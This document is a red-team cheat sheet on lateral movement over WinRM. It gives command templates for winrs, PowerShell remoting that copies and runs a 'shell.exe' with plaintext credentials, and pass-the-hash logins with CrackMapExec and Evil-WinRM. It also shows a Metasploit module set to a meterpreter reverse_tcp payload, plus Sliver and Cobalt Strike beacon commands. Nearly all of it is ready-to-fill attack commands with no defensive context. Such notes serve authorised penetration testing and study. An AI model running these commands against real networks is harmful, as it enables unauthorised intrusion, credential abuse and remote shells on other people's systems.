# WinRM Lateral Movement

## 01 - Winrs

- Using `winrs.exe` to laterally spawn shells via WinRM

```
C:\> winrs -remote:<IP> <commands>

C:\> winrs -r:http://<IP>/wsman <commands>

C:\> winrs -r:<IP> -ad -u:<username> -p:<password> <commands>
```

## 02 - Powershell

- Method 1

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

start-process -filepath C:\path\to\shell.exe -NoNewWindow -Credential $credential -workingdirectory c:\users\public
```

You can pass arguments as well when using `netcat` for example

`PS C:\> Start-Process -FilePath <C:\path\to\program.exe> -NoNewWindow -Credential $credential -ArgumentList ("<arg1>","<arg2>","<arg3>") -WorkingDirectory C:\Users\Public`

- Method 2

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
$ip = New-PSSession -computer <IP>
copy-item shell.exe -destination "c:\users\public\" -tosession $ip

PS C:\> icm -session $ip -scriptblock {c:\users\public\shell.exe}
```

## 03 - CrackMapExec

`$ crackmapexec winrm <IP>/<CIDR> -u "<username>" -p "<password>" -d <domain_name>`

- Pass the Hash

`$ crackmapexec winrm <IP>/<CIDR> -u "<username>" -H "<ntlm_hash>" -d <domain_name>`

## 04 - Evil-WinRM

### 4.1 - Help Menu

```
*Evil-WinRM* PS C:\Users\user\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

### 4.2 - Usage

`$ evil-winrm -i <IP> -r <domain_name> -u <username> -p "<password>"`

- Pass the Hash

`$ evil-winrm -i <IP> -r <domain_name> -u <username> -H "<ntlm_hash>"`

## 05 - Metasploit

TODO: Show step by step with this module

```
msf > use exploit/windows/local/powershell_remoting

msf exploit(windows/local/powershell_remoting) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/powershell_remoting) > options

Module options (exploit/windows/local/powershell_remoting):

  Name                 Current Setting  Required  Description
  ----                 ---------------  --------  -----------
  ExitOnSession        false            yes       Return from the exploit after a session has been created
  HOSTFILE                              no        Line separated file with hostnames to target
  RHOSTS                                no        Target address range or CIDR identifier
  ReverseListenerComm                   no        The specific communication channel to use for this listener
  SESSION                               yes       The session to run this module on
  SMBDomain                             no        The Windows domain to use for authentication
  SMBPass                               no        The password for the specified username
  SMBUser                               no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
  LHOST                      yes       The listen address (an interface may be specified)
  LPORT     4444             yes       The listen port


Exploit target:

  Id  Name
  --  ----
  0   Automatic



View the full module info with the info, or info -d command.  
  
msf exploit(windows/local/powershell_remoting) > 
```

## 06 - Sliver

`sliver (IMPLANT_NAME) > winrm <IP> <command> <domain>\\<username> <password>`

## 07 - Cobalt Strike

### 7.1 - Jump

`beacon> jump <winrm | winrm64> <IP> <listener>`

### 7.2 - Remote-Exec

`beacon> remote-exec winrm <IP> <cmdlets>`

## References

- [SS64 WinRS](https://ss64.com/nt/winrs.html)

- [Powershell New-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2)

- [Powershell Get-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimsession?view=powershell-7.2)

- [HarmJ0y PsRemoting.ps1](https://gist.github.com/HarmJ0y/4c37e43ba4865bdef2a8)